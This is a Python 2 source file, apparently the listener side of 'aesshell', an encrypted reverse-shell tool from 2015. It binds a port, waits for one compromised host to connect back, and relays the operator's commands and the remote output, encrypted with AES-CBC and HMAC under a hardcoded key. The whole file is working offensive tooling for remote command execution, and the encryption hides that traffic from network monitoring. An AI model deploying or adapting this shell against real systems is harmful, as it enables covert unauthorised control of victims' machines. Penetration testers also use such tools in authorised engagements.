#!/usr/bin/env python2
#

import os
import sys
import socket
import select
import subprocess

# pycrypto based aes support
import aes

# deactivated due pyinstaller problems
#import fcrypto as fc

version = "0.3"

def usage():
	print "aesshell v%s using AES-CBC + HMAC-SHA256" % version
	print "listener part, this is were you want back connect to"
	print "spring 2015 by Marco Lux <ping@curesec.com>"
	print
	print "%s <ip> <port>" % (sys.argv[0])

def bindSocket(lip,lport):
	# create a socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# reuse the port if possible 
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	# bind it
	s.bind((lip,lport))

	s.listen(1)

	return s

if len(sys.argv)<3:
	usage()
	sys.exit(1)

lip = sys.argv[1]
lport = int(sys.argv[2])
key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
s = bindSocket(lip,lport)
conn, addr = s.accept()

# initialize fernet
#f = fc.initFernet()

# initialize aes class
ac=aes.Crypticle(key)

# yeah, we just accept one client ;)
inputs = []
inputs.append(sys.stdin)
inputs.append(conn)

cbuffer = ""

print "Connected: ", addr
while True:

	try:
		inputrd, outputrd, errorrd = select.select(inputs,[],[])
	except select.error,e:
		print e
		break
	except socket.error,e:
		print e
		break

	for s in inputrd:
		if s == conn:
			data = s.recv(1)

			if data == '':
				print "Backconnect vanished!"
				sys.exit(1)

#			print repr(data)
			cbuffer += data
#			decContent = fc.decryptContent(f, cbuffer)
			decContent = ac.loads(cbuffer)
			if decContent != -1:
				cbuffer = ""
				print decContent
		else:
			sendData = sys.stdin.readline()

			encContent = ac.dumps(sendData)
			if encContent != -1:
				conn.send(encContent)

print "[*] Finished"
